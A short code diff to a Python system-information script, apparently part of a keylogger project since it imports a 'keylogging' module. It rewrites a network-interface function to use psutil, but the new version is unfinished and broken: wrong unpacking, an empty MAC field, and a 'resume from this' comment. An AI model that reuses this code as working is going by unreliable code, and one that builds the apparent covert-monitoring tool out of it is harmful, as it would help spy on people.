@@ -5,23 +5,18 @@ import platform
 import psutil
 import stat
 import sys
-import netifaces
 from keylogging import *
 # from colorama import Fore, Style
 
 def get_network_infos():
-    ifaces = netifaces.interfaces()
-    IPv4 = netifaces.AF_INET
-    IPv6 = netifaces.AF_LINK
-    for no,inet in enumerate(ifaces):
-        addr = netifaces.ifaddresses(inet)
-        if IPv4 in addr and IPv6 in addr:
-            return f"""
-            Interface {no+1}
-            Interface name : {inet}
-            IP address : {addr[2][0]['addr']}
-            MAC address : {addr[17][0]['addr']}
-            """
+    for no, interface, addrs in enumerate(psutil.net_if_addrs().items()):
+        return f"""
+        Interface {no+1}
+        Interface name : {interface}
+        IP address : {addrs.address}
+        MAC address : {''}
+        """
+    #RESUME FROM THIS 
 
 def get_system_information():
     if platform.system() == 'Windows':
